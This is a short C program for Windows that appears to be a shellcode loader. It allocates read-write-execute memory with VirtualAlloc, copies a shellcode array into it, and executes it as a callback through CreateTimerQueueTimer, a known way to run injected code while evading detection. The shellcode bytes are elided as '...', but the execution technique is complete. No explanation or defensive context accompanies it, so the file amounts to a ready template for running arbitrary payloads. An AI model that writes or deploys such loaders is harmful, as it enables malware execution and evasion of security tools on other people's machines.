#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = ...

int main() {
	LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(addr, shellcode, sizeof(shellcode));
	HANDLE timer;
	HANDLE queue = CreateTimerQueue();
	HANDLE gDoneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0);
	WaitForSingleObject(gDoneEvent, INFINITE);
}